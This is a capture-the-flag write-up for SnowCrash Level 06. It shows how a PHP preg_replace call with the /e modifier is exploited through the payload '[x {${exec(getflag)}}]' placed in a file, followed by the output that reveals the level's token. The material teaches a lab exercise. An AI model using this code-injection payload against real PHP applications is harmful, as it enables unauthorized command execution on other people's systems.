# SnowCrash Level 06

## Introduction
Welcome to SnowCrash Level 06! In this level, we encountered a PHP script and a file that executes the script with a file as an argument.

## Initial Exploration
Upon listing the files, we found a PHP script and a file that executes the script with a file as an argument. We created a file in the `/var/tmp` directory and executed the script successfully. It printed the contents of our text file in `/var/tmp/`.

## Exploitation Attempts
Our goal was to find a way to execute "getflag". Initially, we attempted to break the print function in the script without success. Then, we noticed this line in the script:
```php
$a = preg_replace("/([x (.*)])/e", "y(\"\\2\")", $a);
```
The /e flag executes a command, so we needed to execute our command accordingly.
## Exploiting with preg_replace

We tried various approaches such as [e getflag], "[e getflag]", and [e exec(getflag)], but they didn't work. After some research, we discovered that the $ symbol could help us exploit the script. By understanding how PHP processes commands and strings, we found the correct syntax:
```
'[x {${exec(getflag)}}]'
```
We placed this syntax in a file named /var/tmp/test02 and executed the script with our file as a parameter.

## Results
```
level06@SnowCrash:~$ ./level06 /var/tmp/test02 
PHP Notice: Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1 
PHP Notice: Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
```
